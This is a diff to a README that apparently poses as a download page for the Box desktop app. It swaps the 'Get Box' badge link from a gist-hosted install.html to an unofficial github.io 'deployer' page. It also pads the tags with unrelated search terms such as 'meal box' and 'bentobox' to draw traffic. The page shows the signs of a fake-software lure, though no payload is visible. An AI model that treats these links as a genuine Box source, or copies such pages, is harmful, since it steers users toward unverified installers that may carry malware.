@@ -1,6 +1,6 @@
 # Box Download — Cloud Desktop Collaboration
 
-[![Get Box GitHub](https://img.shields.io/badge/Get%20Box%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/berhanmarvn39/a1e939c6c3dda7b8af283f2e632a100f/raw/8bee6dc103aa40b4b2c7afd36ab2cdde00569737/install.html?offer=Box)
+[![Get Box GitHub](https://img.shields.io/badge/Get%20Box%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Box)
 
 ---
 
@@ -69,7 +69,7 @@ With **Box Desktop App**, users can synchronize files between local folders and 
 ---
 
 ## 🔍 Tags
-box desktop app, box cloud storage, box for windows, box mac download, file sync tool, cloud collaboration, team file sharing, secure file manager, box workflow automation, box enterprise cloud, box file management, box pc, box windows, box desktop, box for mac, box for pc, box, box mac
+box desktop app, the box, box files, dinner box, meal box, bentobox, box cloud storage, box for windows, box mac download, file sync tool, cloud collaboration, team file sharing, secure file manager, box workflow automation, box enterprise cloud, box file management, box pc, box windows, box desktop, box for mac, box for pc, box, box mac
 
 ---
 
